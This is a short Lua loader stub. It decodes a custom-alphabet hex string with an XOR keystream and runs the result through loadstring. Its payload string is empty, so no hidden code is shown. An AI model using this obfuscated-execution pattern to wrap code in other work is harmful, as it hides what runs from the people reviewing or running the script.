local a="dTp8qrYxO6cRlUbj"
local m={} for i=1,#a do m[a:sub(i,i)]=i-1 end
local h=""
local s={} local k=7361360
for j=1,#h,2 do
 k=(k*48271)%2147483647
 local x=m[h:sub(j,j)] local y=m[h:sub(j+1,j+1)]
 s[#s+1]=string.char(bit32.bxor(x*16+y,k%256))
end
local f=loadstring(table.concat(s))
if f then return f() end
